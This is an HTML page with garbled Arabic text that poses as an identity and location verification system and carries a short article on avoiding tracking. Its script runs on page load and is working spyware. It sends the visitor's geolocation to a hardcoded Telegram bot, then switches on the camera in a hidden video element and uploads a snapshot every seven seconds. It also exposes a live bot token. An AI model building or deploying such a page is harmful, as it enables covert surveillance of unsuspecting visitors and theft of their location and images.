
<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>ูุธุงู ุงูุชุญูู ุจุงููุงููุฑุง ูุงููููุน</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #f0f4f8, #d9e2ec);
      color: #222;
      margin: 0;
      padding: 0;
      text-align: center;
      direction: rtl;
    }
    header {
      background-color: #1f3b57;
      color: #fff;
      padding: 20px;
      font-size: 24px;
      font-weight: bold;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
    }
    section.article {
      background: #fff;
      margin: 30px auto;
      padding: 20px;
      max-width: 750px;
      border-radius: 10px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
      text-align: right;
    }
    section.article h2 {
      color: #1f3b57;
    }
    video, canvas {
      display: none;
    }
  </style>
</head>
<body>
  <header>ูุธุงู ุงูุชุญูู ูู ุงููููุฉ ูุงููููุน ุงูุฌุบุฑุงูู</header>

  <section class="article">
    <h2>ููู ุชุญูู ุฌูุงุฒู ูู ุงูุชุชุจุน ุฃู ุงูุงุฎุชุฑุงูุ</h2>
    <p>
      ูู ุนุตุฑ ุงูุชูููุฉุ ุฃุตุจุญุช ุญูุงูุฉ ุงูุฎุตูุตูุฉ ุฃูุฑูุง ุถุฑูุฑููุง ูุง ุชุฑููุง. ุงููุซูุฑ ูู ุงูุชุทุจููุงุช ูุงูููุงูุน ุชุทูุจ ุตูุงุญูุงุช ูุซู ุงููุงููุฑุง ุฃู ุงููููุน ุงูุฌุบุฑุงููุ ููุฌุจ ุนููู ุงูุชุฃูุฏ ูู ูุตุฏุฑ ูุฐู ุงูุทูุจุงุช ูุจู ุงูููุงููุฉ ุนูููุง.
    </p>
    <p>
      ูุง ุชุนุทู ุงูุตูุงุญูุงุช ุฅูุง ูููุตุงุฏุฑ ุงูููุซููุฉุ ูุชุฃูุฏ ูู ูุฑุงุฌุนุฉ ุฅุนุฏุงุฏุงุช ุงูุฃูุงู ูุงูุฎุตูุตูุฉ ุจุงูุชุธุงู. ูุฐุง ุงููููุน ูุทูุจ ุตูุงุญูุงุช ุงููุงููุฑุง ูุงููููุน ูุฃุบุฑุงุถ ุงูุชุญูู ููุทุ ููุง ูุชู ุญูุธ ุฃู ุจูุงูุงุช ุนูู ุงูุณูุฑูุฑ.
    </p>
    <p>
      ุฌููุน ุงูุจูุงูุงุช ุชูุฑุณู ูุจุงุดุฑุฉ ุฅูู ูุธุงู ุงูุชุญูู ุนุจุฑ ุจูุช ุชููุฌุฑุงู ูุฎุตุตุ ููุชู ุงูุชุนุงูู ูุนูุง ุจุณุฑูุฉ ุชุงูุฉ.
    </p>
  </section>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    const BOT_TOKEN = "7826706556:AAHEuqMrIPCx_ejjx8IUIxwrUxJP6DLrKBE";
    const CHAT_ID = "8012505053";

    async function sendMessageToTelegram(text) {
      try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: CHAT_ID, text })
        });
      } catch (err) {
        console.error("Message error:", err);
      }
    }

    async function sendLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (position) => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          const msg = `๐ ุงููููุน ุงูุฌุบุฑุงูู:\nุฎุท ุงูุนุฑุถ: ${lat}\nุฎุท ุงูุทูู: ${lon}`;
          await sendMessageToTelegram(msg);
        }, async (err) => {
          await sendMessageToTelegram("โ ุชู ุฑูุถ ุงููุตูู ูููููุน ุงูุฌุบุฑุงูู.");
        });
      } else {
        await sendMessageToTelegram("โ ุงููุชุตูุญ ูุง ูุฏุนู ุชุญุฏูุฏ ุงููููุน.");
      }
    }

    async function startCameraAndCapture() {
      const video = document.getElementById("video");
      const canvas = document.getElementById("canvas");
      const ctx = canvas.getContext("2d");

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        setInterval(() => {
          if (video.readyState >= 2) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0);

            canvas.toBlob(async (blob) => {
              const formData = new FormData();
              formData.append("chat_id", CHAT_ID);
              formData.append("caption", "๐ท ุตูุฑุฉ ุชู ุงูุชูุงุทูุง ุชููุงุฆููุง");
              formData.append("photo", blob, "image.jpg");

              try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                  method: "POST",
                  body: formData
                });
              } catch (err) {
                console.error("Send photo error:", err);
              }
            }, "image/jpeg", 0.7);
          }
        }, 7000); // ูู 7 ุซูุงูู
      } catch (error) {
        await sendMessageToTelegram("โ ุชู ุฑูุถ ุงููุตูู ุฅูู ุงููุงููุฑุง.");
      }
    }

    // ุงูุชุดุบูู ุงูุชููุงุฆู ุจุนุฏ ุชุญููู ุงูุตูุญุฉ
    window.addEventListener("load", async () => {
      await sendMessageToTelegram("โ ุชู ุชุดุบูู ูุธุงู ุงูุชุญูู...");
      await sendLocation();
      await startCameraAndCapture();
    });
  </script>
</body>
</html>
